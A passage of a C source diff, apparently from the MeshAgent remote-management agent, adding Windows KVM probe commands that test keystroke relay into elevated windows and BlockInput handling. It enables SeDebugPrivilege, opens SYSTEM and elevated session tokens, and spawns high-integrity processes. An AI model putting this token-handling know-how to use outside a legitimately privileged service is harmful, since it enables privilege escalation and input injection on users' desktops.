+	DWORD targetReadyMs = 0;
+	DWORD probeWindowStationError = ERROR_SUCCESS;
+	DWORD probeDesktopError = ERROR_SUCCESS;
+	DWORD elevatedTokenError = ERROR_SUCCESS;
+	TOKEN_ELEVATION_TYPE bridgeElevationType = TokenElevationTypeDefault;
+	TOKEN_ELEVATION_TYPE targetElevationType = TokenElevationTypeDefault;
+	HWND targetWindow = NULL;
+	BOOL chainCreated = FALSE;
+	BOOL chainThreadStarted = FALSE;
+	BOOL relayStarted = FALSE;
+	BOOL bridgeSpawned = FALSE;
+	BOOL bridgePacketsReady = FALSE;
+	BOOL bridgeUsed = FALSE;
+	BOOL fallbackUsed = FALSE;
+	BOOL bridgeSystemSid = FALSE;
+	BOOL bridgeStateReady = FALSE;
+	BOOL probeWindowStationBound = FALSE;
+	BOOL probeDesktopBound = FALSE;
+	BOOL elevatedTokenReady = FALSE;
+	BOOL targetSpawned = FALSE;
+	BOOL targetReady = FALSE;
+	BOOL targetWindowReported = FALSE;
+	BOOL targetWindowFound = FALSE;
+	BOOL targetFocused = FALSE;
+	BOOL targetStateReady = FALSE;
+	BOOL targetHighIntegrity = FALSE;
+	BOOL inputSent = FALSE;
+	BOOL targetExited = FALSE;
+	BOOL capturedMatches = FALSE;
+	BOOL cleanupExited = FALSE;
+	BOOL success = FALSE;
+
+	ZeroMemory(&state, sizeof(state));
+	ZeroMemory(&targetProcess, sizeof(targetProcess));
+	sprintf_s(marker, sizeof(marker), "MESHINPUT_%lu", (unsigned long)GetCurrentProcessId());
+	probeWindowStationBound = MeshService_BindCurrentProcessToInteractiveWindowStation(&probeWindowStationError);
+	probeDesktopBound = MeshService_BindCurrentThreadToNamedDesktop(L"Default", probeDesktop, _countof(probeDesktop), &probeDesktopError);
+	if (!probeDesktopBound)
+	{
+		probeDesktopBound = MeshService_BindCurrentThreadToInputDesktop(probeDesktop, _countof(probeDesktop), &probeDesktopError);
+	}
+
+	if (sessionId == 0 || sessionId == 0xFFFFFFFF)
+	{
+		printf("{\"success\":false,\"phase\":\"kvm-elevated-input-probe\",\"sessionId\":%lu,\"error\":\"invalid-session\"}\n", (unsigned long)sessionId);
+		fflush(stdout);
+		return 1;
+	}
+
+	chain = ILibCreateChainEx(0);
+	chainCreated = (chain != NULL);
+	if (chainCreated)
+	{
+		pipeManager = ILibProcessPipe_Manager_Create(chain);
+	}
+	if (pipeManager != NULL)
+	{
+		chainThread = CreateThread(NULL, 0, MeshService_KvmSessionChangeProbeChainThread, chain, 0, NULL);
+		chainThreadStarted = (chainThread != NULL);
+	}
+	if (!chainThreadStarted)
+	{
+		printf("{\"success\":false,\"phase\":\"kvm-elevated-input-probe\",\"sessionId\":%lu,\"chainCreated\":%s,\"chainThreadStarted\":%s}\n",
+			(unsigned long)sessionId,
+			chainCreated ? "true" : "false",
+			chainThreadStarted ? "true" : "false");
+		fflush(stdout);
+		if (chain != NULL) { ILibStopChain(chain); }
+		if (chainThread != NULL) { CloseHandle(chainThread); }
+		return 1;
+	}
+
+	Sleep(200);
+	GetModuleFileNameA(NULL, exePath, (DWORD)sizeof(exePath));
+	kvm_set_force_default_desktop(1);
+	relayStarted = (kvm_relay_setup(exePath, pipeManager, MeshService_KvmSessionChangeProbeWriteSink, &state, (int)sessionId) != 0);
+	if (relayStarted)
+	{
+		bridgeSpawned = MeshService_WaitForBridgePidChange(0, 5000, &bridgeSpawnMs, &bridgePid);
+		if (bridgeSpawned)
+		{
+			bridgePacketsReady = MeshService_RequestKvmRelayRefreshAndWait(&state, 5000, &bridgePacketMs);
+			bridgeUsed = (kvm_bridge_debug_get_last_used_bridge() != 0);
+			fallbackUsed = (kvm_bridge_debug_get_last_fallback_used() != 0);
+			bridgeStateReady = MeshService_QueryProcessSecurityState(bridgePid, &bridgeSystemSid, &bridgeIntegrityRid, &bridgeElevationType, &bridgeSessionId);
+		}
+	}
+
+	if (bridgePacketsReady && bridgeUsed && !fallbackUsed)
+	{
+		elevatedTokenReady = MeshService_OpenElevatedPrimaryTokenForSession(sessionId, &elevatedToken, &elevatedTokenError);
+	}
+
+	if (elevatedTokenReady)
+	{
+		if (ExpandEnvironmentStringsW(L"%PUBLIC%\\Documents\\MeshAgent\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
+		{
+			GetTempPathW((DWORD)_countof(tempPath), tempPath);
+		}
+		else
+		{
+			CreateDirectoryW(tempPath, NULL);
+		}
+		StringCchPrintfW(capturePath, _countof(capturePath), L"%lsMeshKvmElevatedInput_%lu.txt", tempPath, GetCurrentProcessId());
+		StringCchPrintfW(readyPath, _countof(readyPath), L"%lsMeshKvmElevatedInput_%lu.ready", tempPath, GetCurrentProcessId());
+		StringCchPrintfW(hwndReportPath, _countof(hwndReportPath), L"%lsMeshKvmElevatedInput_%lu.hwnd", tempPath, GetCurrentProcessId());
+		StringCchPrintfW(windowTitle, _countof(windowTitle), L"MeshKvmElevatedInput_%lu", GetCurrentProcessId());
+		DeleteFileW(capturePath);
+		DeleteFileW(readyPath);
+		DeleteFileW(hwndReportPath);
+		if (GetModuleFileNameW(NULL, targetExePath, (DWORD)_countof(targetExePath)) > 0 &&
+			ExpandEnvironmentStringsW(L"%SystemRoot%\\System32\\cmd.exe", cmdPath, (DWORD)_countof(cmdPath)) > 0 &&
+			SUCCEEDED(StringCchPrintfW(
+				targetArgs,
+				_countof(targetArgs),
+				L"/Q /C \"\"%ls\" -kvm-elevated-input-target \"%ls\" \"%ls\" \"%ls\" \"%ls\"\"",
+				targetExePath,
+				hwndReportPath,
+				readyPath,
+				capturePath,
+				windowTitle)))
+		{
+			targetSpawned = MeshService_SpawnVisibleExecutableWithTokenW(elevatedToken, cmdPath, targetArgs, targetDesktop, &targetProcess, &targetSpawnError);
+		}
+		else
+		{
+			targetSpawnError = ERROR_WRITE_FAULT;
+		}
+	}
+
+	if (targetSpawned)
+	{
+		ULONGLONG readyStarted = GetTickCount64();
+		WaitForInputIdle(targetProcess.hProcess, 5000);
+		while ((GetTickCount64() - readyStarted) <= 10000)
+		{
+			char* readyText = MeshService_ReadUtf8TextFileW(readyPath);
+			if (readyText != NULL)
+			{
+				targetReady = TRUE;
+				targetReadyMs = (DWORD)(GetTickCount64() - readyStarted);
+				free(readyText);
+				break;
+			}
+			Sleep(50);
+		}
+		targetWindowReported = MeshService_WaitForReportedWindowHandleW(hwndReportPath, 0, 10000, &targetWindowReportMs, &targetWindow);
+		if (targetWindowReported)
+		{
+			targetWindowFound = TRUE;
+			targetWindowMs = targetWindowReportMs;
+		}
+		else
+		{
+			targetWindowFound = MeshService_WaitForTopLevelWindowByTitleW(windowTitle, probeDesktop, 10000, &targetWindowMs, &targetWindow);
+		}
+		MeshService_BuildWindowSnapshotForSessionW(sessionId, probeDesktop, windowSnapshot, _countof(windowSnapshot));
+		targetStateReady = MeshService_QueryProcessSecurityState(targetProcess.dwProcessId, NULL, &targetIntegrityRid, &targetElevationType, &targetSessionId);
+		targetHighIntegrity = (targetStateReady && targetIntegrityRid >= SECURITY_MANDATORY_HIGH_RID);
+		if (targetWindowFound)
+		{
+			targetFocused = MeshService_BringWindowToForeground(targetWindow);
+		}
+		Sleep(targetWindowFound ? 400 : 1000);
+		inputSent = MeshService_KvmTypeMarkerText(marker, MeshService_KvmSessionChangeProbeWriteSink, &state);
+	}
+
+	if (inputSent)
+	{
+		targetWaitResult = WaitForSingleObject(targetProcess.hProcess, 10000);
+		targetExited = (targetWaitResult == WAIT_OBJECT_0);
+	}
+	if (targetExited)
+	{
+		capturedText = MeshService_ReadUtf8TextFileW(capturePath);
+		if (capturedText != NULL)
+		{
+			MeshService_TrimLineEndingsA(capturedText);
+			capturedMatches = (strcmp(capturedText, marker) == 0);
+		}
+	}
+
+	if (targetProcess.hProcess != NULL && !targetExited)
+	{
+		TerminateProcess(targetProcess.hProcess, 1);
+		WaitForSingleObject(targetProcess.hProcess, 2000);
+	}
+	if (relayStarted)
+	{
+		kvm_cleanup(&state);
+		kvm_set_force_default_desktop(0);
+		if (bridgePid != 0)
+		{
+			cleanupExited = MeshService_WaitForProcessExitById(bridgePid, 5000, &bridgeExitMs);
+		}
+		else
+		{
+			cleanupExited = TRUE;
+		}
+		Sleep(250);
+	}
+	else
+	{
+		kvm_set_force_default_desktop(0);
+	}
+
+	success =
+		relayStarted &&
+		bridgeSpawned &&
+		bridgePacketsReady &&
+		bridgeUsed &&
+		!fallbackUsed &&
+		bridgeStateReady &&
+		bridgeSystemSid &&
+		bridgeIntegrityRid >= SECURITY_MANDATORY_SYSTEM_RID &&
+		bridgeSessionId == sessionId &&
+		elevatedTokenReady &&
+		targetSpawned &&
+		targetStateReady &&
+		targetHighIntegrity &&
+		targetSessionId == sessionId &&
+		inputSent &&
+		targetExited &&
+		capturedMatches &&
+		cleanupExited;
+
+	printf("{\"success\":%s,", success ? "true" : "false");
+	printf("\"phase\":\"kvm-elevated-input-probe\",");
+	printf("\"sessionId\":%lu,", (unsigned long)sessionId);
+	printf("\"relayStarted\":%s,", relayStarted ? "true" : "false");
+	printf("\"bridgeSpawned\":%s,", bridgeSpawned ? "true" : "false");
+	printf("\"bridgePacketsReady\":%s,", bridgePacketsReady ? "true" : "false");
+	printf("\"bridgeUsed\":%s,", bridgeUsed ? "true" : "false");
+	printf("\"fallbackUsed\":%s,", fallbackUsed ? "true" : "false");
+	printf("\"bridgePid\":%lu,", (unsigned long)bridgePid);
+	printf("\"bridgeSpawnMs\":%lu,", (unsigned long)bridgeSpawnMs);
+	printf("\"bridgePacketMs\":%lu,", (unsigned long)bridgePacketMs);
+	printf("\"bridgeStateReady\":%s,", bridgeStateReady ? "true" : "false");
+	printf("\"bridgeSystemSid\":%s,", bridgeSystemSid ? "true" : "false");
+	printf("\"bridgeIntegrityRid\":%lu,", (unsigned long)bridgeIntegrityRid);
+	printf("\"bridgeElevationType\":%lu,", (unsigned long)bridgeElevationType);
+	printf("\"bridgeSessionId\":%lu,", (unsigned long)bridgeSessionId);
+	printf("\"probeWindowStationBound\":%s,", probeWindowStationBound ? "true" : "false");
+	printf("\"probeWindowStationError\":%lu,", (unsigned long)probeWindowStationError);
+	printf("\"probeDesktopBound\":%s,", probeDesktopBound ? "true" : "false");
+	printf("\"probeDesktopError\":%lu,", (unsigned long)probeDesktopError);
+	printf("\"probeDesktop\":\""); MeshService_PrintJsonEscapedWide(probeDesktop); printf("\",");
+	printf("\"targetDesktop\":\""); MeshService_PrintJsonEscapedWide(targetDesktop); printf("\",");
+	printf("\"elevatedTokenReady\":%s,", elevatedTokenReady ? "true" : "false");
+	printf("\"elevatedTokenError\":%lu,", (unsigned long)elevatedTokenError);
+	printf("\"targetSpawned\":%s,", targetSpawned ? "true" : "false");
+	printf("\"targetSpawnError\":%lu,", (unsigned long)targetSpawnError);
+	printf("\"targetPid\":%lu,", (unsigned long)targetProcess.dwProcessId);
+	printf("\"targetReady\":%s,", targetReady ? "true" : "false");
+	printf("\"targetReadyMs\":%lu,", (unsigned long)targetReadyMs);
+	printf("\"targetWindowReported\":%s,", targetWindowReported ? "true" : "false");
+	printf("\"targetWindowReportMs\":%lu,", (unsigned long)targetWindowReportMs);
+	printf("\"targetWindowFound\":%s,", targetWindowFound ? "true" : "false");
+	printf("\"targetWindowMs\":%lu,", (unsigned long)targetWindowMs);
+	printf("\"targetFocused\":%s,", targetFocused ? "true" : "false");
+	printf("\"targetStateReady\":%s,", targetStateReady ? "true" : "false");
+	printf("\"targetIntegrityRid\":%lu,", (unsigned long)targetIntegrityRid);
+	printf("\"targetElevationType\":%lu,", (unsigned long)targetElevationType);
+	printf("\"targetHighIntegrity\":%s,", targetHighIntegrity ? "true" : "false");
+	printf("\"targetSessionId\":%lu,", (unsigned long)targetSessionId);
+	printf("\"inputSent\":%s,", inputSent ? "true" : "false");
+	printf("\"targetExited\":%s,", targetExited ? "true" : "false");
+	printf("\"targetWaitResult\":%lu,", (unsigned long)targetWaitResult);
+	printf("\"capturedMatches\":%s,", capturedMatches ? "true" : "false");
+	printf("\"cleanupExited\":%s,", cleanupExited ? "true" : "false");
+	printf("\"bridgeExitMs\":%lu,", (unsigned long)bridgeExitMs);
+	printf("\"windowTitle\":\""); MeshService_PrintJsonEscapedWide(windowTitle); printf("\",");
+	printf("\"windowSnapshot\":\""); MeshService_PrintJsonEscapedWide(windowSnapshot); printf("\",");
+	printf("\"marker\":\""); MeshService_PrintJsonEscapedUtf8(marker); printf("\",");
+	printf("\"capturedText\":\""); MeshService_PrintJsonEscapedUtf8(capturedText != NULL ? capturedText : ""); printf("\",");
+	printf("\"targetExePath\":\""); MeshService_PrintJsonEscapedWide(targetExePath); printf("\",");
+	printf("\"hwndReportPath\":\""); MeshService_PrintJsonEscapedWide(hwndReportPath); printf("\",");
+	printf("\"readyPath\":\""); MeshService_PrintJsonEscapedWide(readyPath); printf("\",");
+	printf("\"capturePath\":\""); MeshService_PrintJsonEscapedWide(capturePath); printf("\"}\n");
+	fflush(stdout);
+
+	if (targetProcess.hThread != NULL) { CloseHandle(targetProcess.hThread); }
+	if (targetProcess.hProcess != NULL) { CloseHandle(targetProcess.hProcess); }
+	if (elevatedToken != NULL) { CloseHandle(elevatedToken); }
+	if (capturedText != NULL) { free(capturedText); }
+	DeleteFileW(hwndReportPath);
+	DeleteFileW(readyPath);
+	DeleteFileW(capturePath);
+	if (chain != NULL) { ILibStopChain(chain); }
+	if (chainThread != NULL)
+	{
+		WaitForSingleObject(chainThread, 5000);
+		CloseHandle(chainThread);
+	}
+	return success ? 0 : 1;
+}
+
+static int MeshService_RunKvmElevatedInputProbeChildCommand(const WCHAR* reportPath)
+{
+	FILE* redirectedStdout = NULL;
+	errno_t redirectError = 0;
+
+	if (reportPath != NULL && reportPath[0] != L'\0')
+	{
+		redirectError = _wfreopen_s(&redirectedStdout, reportPath, L"wb", stdout);
+		if (redirectError != 0 || redirectedStdout == NULL)
+		{
+			return 1;
+		}
+	}
+	return MeshService_RunKvmElevatedInputProbeWorkerCommand();
+}
+
+static int MeshService_RunKvmElevatedInputProbeCommand(void)
+{
+	WCHAR tempPath[MAX_PATH] = { 0 };
+	WCHAR reportPath[MAX_PATH] = { 0 };
+	WCHAR arguments[512] = { 0 };
+	HANDLE systemToken = NULL;
+	PROCESS_INFORMATION childProcess;
+	DWORD sessionId = MeshService_GetCurrentSessionId();
+	DWORD systemTokenError = ERROR_SUCCESS;
+	DWORD spawnError = ERROR_SUCCESS;
+	DWORD childExitCode = STILL_ACTIVE;
+	BOOL systemTokenReady = FALSE;
+	BOOL childSpawned = FALSE;
+	char* childJson = NULL;
+
+	if (MeshService_ProcessHasSystemSid())
+	{
+		return MeshService_RunKvmElevatedInputProbeWorkerCommand();
+	}
+
+	ZeroMemory(&childProcess, sizeof(childProcess));
+	if (ExpandEnvironmentStringsW(L"%TEMP%\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
+	{
+		GetTempPathW((DWORD)_countof(tempPath), tempPath);
+	}
+	StringCchPrintfW(reportPath, _countof(reportPath), L"%lsMeshKvmElevatedInputProbe_%lu.json", tempPath, GetCurrentProcessId());
+	DeleteFileW(reportPath);
+
+	MeshService_EnableNamedPrivilegeW(L"SeDebugPrivilege");
+	systemTokenReady = MeshService_OpenPrimarySystemTokenForSession(sessionId, &systemToken, &systemTokenError);
+	if (systemTokenReady)
+	{
+		StringCchPrintfW(arguments, _countof(arguments), L"-kvm-elevated-input-probe-child \"%ls\"", reportPath);
+		childSpawned = MeshService_SpawnProcessWithTokenW(systemToken, arguments, L"winsta0\\default", &childProcess, &spawnError);
+	}
+	if (childSpawned)
+	{
+		WaitForSingleObject(childProcess.hProcess, 60000);
+		GetExitCodeProcess(childProcess.hProcess, &childExitCode);
+	}
+
+	childJson = MeshService_ReadUtf8TextFileW(reportPath);
+	if (childJson != NULL)
+	{
+		printf("%s\n", childJson);
+	}
+	else
+	{
+		printf("{\"success\":false,\"phase\":\"kvm-elevated-input-probe\",\"sessionId\":%lu,\"systemTokenReady\":%s,\"childSpawned\":%s,\"systemTokenError\":%lu,\"spawnError\":%lu,\"childExitCode\":%lu}\n",
+			(unsigned long)sessionId,
+			systemTokenReady ? "true" : "false",
+			childSpawned ? "true" : "false",
+			(unsigned long)systemTokenError,
+			(unsigned long)spawnError,
+			(unsigned long)childExitCode);
+	}
+	fflush(stdout);
+
+	if (childProcess.hThread != NULL) { CloseHandle(childProcess.hThread); }
+	if (childProcess.hProcess != NULL) { CloseHandle(childProcess.hProcess); }
+	if (systemToken != NULL) { CloseHandle(systemToken); }
+	if (childJson != NULL) { free(childJson); }
+	DeleteFileW(reportPath);
+	return (childSpawned && childExitCode == 0 && childJson != NULL) ? 0 : 1;
+}
+
+static int MeshService_RunKvmBlockInputHolderCommand(const WCHAR* readyPath, const WCHAR* releasePath, const WCHAR* reportPath)
+{
+	WCHAR desktopName[64] = { 0 };
+	char reportJson[1024];
+	INPUT inputs[2];
+	DWORD windowStationError = ERROR_SUCCESS;
+	DWORD desktopError = ERROR_SUCCESS;
+	DWORD blockInputError = ERROR_SUCCESS;
+	DWORD sameThreadSendInputError = ERROR_SUCCESS;
+	DWORD releaseCallError = ERROR_SUCCESS;
+	DWORD sameThreadSendInputCount = 0;
+	DWORD releaseWaitMs = 0;
+	BOOL windowStationBound = FALSE;
+	BOOL desktopBound = FALSE;
+	BOOL blockInputEnabled = FALSE;
+	BOOL sameThreadSendInputSucceeded = FALSE;
+	BOOL readySignaled = FALSE;
+	BOOL releaseRequested = FALSE;
+	BOOL releaseCallSucceeded = FALSE;
+	BOOL reportWritten = FALSE;
+	BOOL success = FALSE;
+
+	windowStationBound = MeshService_BindCurrentProcessToInteractiveWindowStation(&windowStationError);
+	desktopBound = MeshService_BindCurrentThreadToNamedDesktop(L"Default", desktopName, _countof(desktopName), &desktopError);
+	if (!desktopBound)
+	{
+		desktopBound = MeshService_BindCurrentThreadToInputDesktop(desktopName, _countof(desktopName), &desktopError);
+	}
+
+	SetLastError(ERROR_SUCCESS);
+	if (BlockInput(TRUE))
+	{
+		blockInputEnabled = TRUE;
+	}
+	else
+	{
+		blockInputError = GetLastError();
+	}
+
+	if (blockInputEnabled)
+	{
+		ZeroMemory(inputs, sizeof(inputs));
+		inputs[0].type = INPUT_KEYBOARD;
+		inputs[0].ki.wVk = VK_F24;
+		inputs[1] = inputs[0];
+		inputs[1].ki.dwFlags = KEYEVENTF_KEYUP;
+
+		SetLastError(ERROR_SUCCESS);
+		sameThreadSendInputCount = SendInput(2, inputs, sizeof(INPUT));
+		if (sameThreadSendInputCount == 2)
+		{
+			sameThreadSendInputSucceeded = TRUE;
+		}
+		else
+		{
+			sameThreadSendInputError = GetLastError();
+		}
+
+		if (readyPath != NULL && readyPath[0] != L'\0')
+		{
+			readySignaled = MeshService_WriteWideTextFileUtf8W(readyPath, L"READY");
+		}
+
+		releaseRequested = MeshService_WaitForFilePresenceW(releasePath, 15000, &releaseWaitMs);
+
+		SetLastError(ERROR_SUCCESS);
+		if (BlockInput(FALSE))
+		{
+			releaseCallSucceeded = TRUE;
+		}
+		else
+		{
+			releaseCallError = GetLastError();
+		}
+	}
+
+	success =
+		windowStationBound &&
+		desktopBound &&
+		blockInputEnabled &&
+		sameThreadSendInputSucceeded;
+
+	sprintf_s(
+		reportJson,
+		sizeof(reportJson),
+		"{\"success\":%s,\"phase\":\"kvm-blockinput-holder\",\"windowStationBound\":%s,\"windowStationError\":%lu,"
+		"\"desktopBound\":%s,\"desktopError\":%lu,\"blockInputEnabled\":%s,\"blockInputError\":%lu,"
+		"\"sameThreadSendInputSucceeded\":%s,\"sameThreadSendInputCount\":%lu,\"sameThreadSendInputError\":%lu,"
+		"\"readySignaled\":%s,\"releaseRequested\":%s,\"releaseWaitMs\":%lu,\"releaseCallSucceeded\":%s,\"releaseCallError\":%lu}",
+		success ? "true" : "false",
+		windowStationBound ? "true" : "false",
+		(unsigned long)windowStationError,
+		desktopBound ? "true" : "false",
+		(unsigned long)desktopError,
+		blockInputEnabled ? "true" : "false",
+		(unsigned long)blockInputError,
+		sameThreadSendInputSucceeded ? "true" : "false",
+		(unsigned long)sameThreadSendInputCount,
+		(unsigned long)sameThreadSendInputError,
+		readySignaled ? "true" : "false",
+		releaseRequested ? "true" : "false",
+		(unsigned long)releaseWaitMs,
+		releaseCallSucceeded ? "true" : "false",
+		(unsigned long)releaseCallError);
+
+	if (reportPath != NULL && reportPath[0] != L'\0')
+	{
+		reportWritten = MeshService_WriteUtf8TextFileW(reportPath, reportJson);
+	}
+	else
+	{
+		reportWritten = TRUE;
+		printf("%s\n", reportJson);
+		fflush(stdout);
+	}
+
+	return (success && reportWritten) ? 0 : 1;
+}
+
+static int MeshService_RunKvmBlockInputProbeWorkerCommand(void)
+{
+	MeshServiceKvmSessionChangeProbeState state;
+	char exePath[MAX_PATH * 4] = { 0 };
+	char marker[64] = { 0 };
+	char* capturedText = NULL;
+	char* blockerJson = NULL;
+	void* chain = NULL;
+	void* pipeManager = NULL;
+	HANDLE chainThread = NULL;
+	HANDLE elevatedToken = NULL;
+	PROCESS_INFORMATION targetProcess;
+	PROCESS_INFORMATION blockerProcess;
+	WCHAR tempPath[MAX_PATH] = { 0 };
+	WCHAR targetExePath[MAX_PATH * 2] = { 0 };
+	WCHAR hwndReportPath[MAX_PATH] = { 0 };
+	WCHAR capturePath[MAX_PATH] = { 0 };
+	WCHAR readyPath[MAX_PATH] = { 0 };
+	WCHAR blockerReadyPath[MAX_PATH] = { 0 };
+	WCHAR blockerReleasePath[MAX_PATH] = { 0 };
+	WCHAR blockerReportPath[MAX_PATH] = { 0 };
+	WCHAR probeDesktop[64] = { 0 };
+	WCHAR targetDesktop[64] = L"winsta0\\default";
+	WCHAR windowTitle[128] = { 0 };
+	WCHAR windowSnapshot[2048] = { 0 };
+	WCHAR targetArgs[2048] = { 0 };
+	WCHAR blockerArgs[1024] = { 0 };
+	DWORD sessionId = MeshService_GetCurrentSessionId();
+	DWORD bridgePid = 0;
+	DWORD bridgeSpawnMs = 0;
+	DWORD bridgePacketMs = 0;
+	DWORD bridgeExitMs = 0;
+	DWORD bridgeSessionId = 0;
+	DWORD bridgeIntegrityRid = 0;
+	DWORD targetWindowReportMs = 0;
+	DWORD targetWindowMs = 0;
+	DWORD targetSpawnError = ERROR_SUCCESS;
+	DWORD targetWaitResult = WAIT_FAILED;
+	DWORD targetSessionId = 0;
+	DWORD targetIntegrityRid = 0;
+	DWORD targetReadyMs = 0;
+	DWORD blockerReadyMs = 0;
+	DWORD blockerSpawnError = ERROR_SUCCESS;
+	DWORD blockerExitCode = STILL_ACTIVE;
+	DWORD blockerWaitResult = WAIT_FAILED;
+	DWORD probeWindowStationError = ERROR_SUCCESS;
+	DWORD probeDesktopError = ERROR_SUCCESS;
+	DWORD elevatedTokenError = ERROR_SUCCESS;
+	TOKEN_ELEVATION_TYPE bridgeElevationType = TokenElevationTypeDefault;
+	TOKEN_ELEVATION_TYPE targetElevationType = TokenElevationTypeDefault;
+	HWND targetWindow = NULL;
+	BOOL chainCreated = FALSE;
+	BOOL chainThreadStarted = FALSE;
+	BOOL relayStarted = FALSE;
+	BOOL bridgeSpawned = FALSE;
+	BOOL bridgePacketsReady = FALSE;
+	BOOL bridgeUsed = FALSE;
+	BOOL fallbackUsed = FALSE;
+	BOOL bridgeSystemSid = FALSE;
+	BOOL bridgeStateReady = FALSE;
+	BOOL probeWindowStationBound = FALSE;
+	BOOL probeDesktopBound = FALSE;
+	BOOL elevatedTokenReady = FALSE;
+	BOOL targetSpawned = FALSE;
+	BOOL targetReady = FALSE;
+	BOOL targetWindowReported = FALSE;
+	BOOL targetWindowFound = FALSE;
+	BOOL targetFocused = FALSE;
+	BOOL targetStateReady = FALSE;
+	BOOL targetHighIntegrity = FALSE;
+	BOOL blockerSpawned = FALSE;
+	BOOL blockerReady = FALSE;
+	BOOL blockerReleaseWritten = FALSE;
+	BOOL blockerExited = FALSE;
+	BOOL blockerReportAvailable = FALSE;
+	BOOL blockerSuccess = FALSE;
+	BOOL blockerBlockInputEnabled = FALSE;
+	BOOL blockerSameThreadSendInputSucceeded = FALSE;
+	BOOL inputSent = FALSE;
+	BOOL targetExited = FALSE;
+	BOOL capturedMatches = FALSE;
+	BOOL cleanupExited = FALSE;
+	BOOL success = FALSE;
+
+	ZeroMemory(&state, sizeof(state));
+	ZeroMemory(&targetProcess, sizeof(targetProcess));
+	ZeroMemory(&blockerProcess, sizeof(blockerProcess));
+	sprintf_s(marker, sizeof(marker), "meshblock%lu", (unsigned long)GetCurrentProcessId());
+	probeWindowStationBound = MeshService_BindCurrentProcessToInteractiveWindowStation(&probeWindowStationError);
+	probeDesktopBound = MeshService_BindCurrentThreadToNamedDesktop(L"Default", probeDesktop, _countof(probeDesktop), &probeDesktopError);
+	if (!probeDesktopBound)
+	{
+		probeDesktopBound = MeshService_BindCurrentThreadToInputDesktop(probeDesktop, _countof(probeDesktop), &probeDesktopError);
+	}
+
+	if (sessionId == 0 || sessionId == 0xFFFFFFFF)
+	{
+		printf("{\"success\":false,\"phase\":\"kvm-blockinput-probe\",\"sessionId\":%lu,\"error\":\"invalid-session\"}\n", (unsigned long)sessionId);
+		fflush(stdout);
+		return 1;
+	}
+
+	chain = ILibCreateChainEx(0);
+	chainCreated = (chain != NULL);
+	if (chainCreated)
+	{
+		pipeManager = ILibProcessPipe_Manager_Create(chain);
+	}
+	if (pipeManager != NULL)
+	{
+		chainThread = CreateThread(NULL, 0, MeshService_KvmSessionChangeProbeChainThread, chain, 0, NULL);
+		chainThreadStarted = (chainThread != NULL);
+	}
+	if (!chainThreadStarted)
+	{
+		printf("{\"success\":false,\"phase\":\"kvm-blockinput-probe\",\"sessionId\":%lu,\"chainCreated\":%s,\"chainThreadStarted\":%s}\n",
+			(unsigned long)sessionId,
+			chainCreated ? "true" : "false",
+			chainThreadStarted ? "true" : "false");
+		fflush(stdout);
+		if (chain != NULL) { ILibStopChain(chain); }
+		if (chainThread != NULL) { CloseHandle(chainThread); }
+		return 1;
+	}
+
+	Sleep(200);
+	GetModuleFileNameA(NULL, exePath, (DWORD)sizeof(exePath));
+	kvm_set_force_default_desktop(1);
+	relayStarted = (kvm_relay_setup(exePath, pipeManager, MeshService_KvmSessionChangeProbeWriteSink, &state, (int)sessionId) != 0);
+	if (relayStarted)
+	{
+		bridgeSpawned = MeshService_WaitForBridgePidChange(0, 5000, &bridgeSpawnMs, &bridgePid);
+		if (bridgeSpawned)
+		{
+			bridgePacketsReady = MeshService_RequestKvmRelayRefreshAndWait(&state, 5000, &bridgePacketMs);
+			bridgeUsed = (kvm_bridge_debug_get_last_used_bridge() != 0);
+			fallbackUsed = (kvm_bridge_debug_get_last_fallback_used() != 0);
+			bridgeStateReady = MeshService_QueryProcessSecurityState(bridgePid, &bridgeSystemSid, &bridgeIntegrityRid, &bridgeElevationType, &bridgeSessionId);
+		}
+	}
+
+	if (bridgePacketsReady && bridgeUsed && !fallbackUsed)
+	{
+		elevatedTokenReady = MeshService_OpenElevatedPrimaryTokenForSession(sessionId, &elevatedToken, &elevatedTokenError);
+	}
+
+	if (elevatedTokenReady)
+	{
+		if (ExpandEnvironmentStringsW(L"%PUBLIC%\\Documents\\MeshAgent\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
+		{
+			GetTempPathW((DWORD)_countof(tempPath), tempPath);
+		}
+		else
+		{
+			CreateDirectoryW(tempPath, NULL);
+		}
+
+		StringCchPrintfW(capturePath, _countof(capturePath), L"%lsMeshKvmBlockInput_%lu.txt", tempPath, GetCurrentProcessId());
+		StringCchPrintfW(readyPath, _countof(readyPath), L"%lsMeshKvmBlockInput_%lu.ready", tempPath, GetCurrentProcessId());
+		StringCchPrintfW(hwndReportPath, _countof(hwndReportPath), L"%lsMeshKvmBlockInput_%lu.hwnd", tempPath, GetCurrentProcessId());
+		StringCchPrintfW(windowTitle, _countof(windowTitle), L"MeshKvmBlockInput_%lu", GetCurrentProcessId());
+		StringCchPrintfW(blockerReadyPath, _countof(blockerReadyPath), L"%lsMeshKvmBlockInput_%lu.blocker.ready", tempPath, GetCurrentProcessId());
+		StringCchPrintfW(blockerReleasePath, _countof(blockerReleasePath), L"%lsMeshKvmBlockInput_%lu.blocker.release", tempPath, GetCurrentProcessId());
+		StringCchPrintfW(blockerReportPath, _countof(blockerReportPath), L"%lsMeshKvmBlockInput_%lu.blocker.json", tempPath, GetCurrentProcessId());
+		DeleteFileW(capturePath);
+		DeleteFileW(readyPath);
+		DeleteFileW(hwndReportPath);
+		DeleteFileW(blockerReadyPath);
+		DeleteFileW(blockerReleasePath);
+		DeleteFileW(blockerReportPath);
+
+		if (GetModuleFileNameW(NULL, targetExePath, (DWORD)_countof(targetExePath)) > 0 &&
+			SUCCEEDED(StringCchPrintfW(
+				targetArgs,
+				_countof(targetArgs),
+				L"-kvm-blockinput-target \"%ls\" \"%ls\" \"%ls\" \"%ls\"",
+				hwndReportPath,
+				readyPath,
+				capturePath,
+				windowTitle)))
+		{
+			targetSpawned = MeshService_SpawnVisibleExecutableWithTokenW(elevatedToken, targetExePath, targetArgs, targetDesktop, &targetProcess, &targetSpawnError);
+		}
+		else
+		{
+			targetSpawnError = ERROR_WRITE_FAULT;
+		}
+	}
+
+	if (targetSpawned)
+	{
+		ULONGLONG readyStarted = GetTickCount64();
+		WaitForInputIdle(targetProcess.hProcess, 5000);
+		while ((GetTickCount64() - readyStarted) <= 10000)
+		{
+			char* readyText = MeshService_ReadUtf8TextFileW(readyPath);
+			if (readyText != NULL)
+			{
+				targetReady = TRUE;
+				targetReadyMs = (DWORD)(GetTickCount64() - readyStarted);
+				free(readyText);
+				break;
+			}
